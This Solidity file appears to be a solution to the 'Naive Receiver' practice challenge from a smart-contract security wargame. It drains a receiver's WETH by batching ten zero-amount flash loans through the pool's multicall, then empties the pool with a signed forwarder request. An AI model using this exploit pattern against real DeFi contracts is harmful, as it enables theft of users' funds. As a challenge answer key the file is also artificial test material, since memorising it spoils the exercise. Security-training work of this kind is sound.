// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract Solution {
    constructor(
        NaiveReceiverPool pool,
        WETH weth,
        BasicForwarder forwarder,
        address receiver,
        BasicForwarder.Request memory request,
        bytes memory signature
    ) payable {
        // get all receiver's weth 
        bytes[] memory data = new bytes[](10);
        for (uint256 i; i < 10; ++i) {
            data[i] = abi.encodeWithSelector(
                pool.flashLoan.selector,
                receiver,
                address(weth),
                0,
                ""
            );
        }
        pool.multicall(data);
        
        // get all weth
        forwarder.execute(request, signature);
    }
}
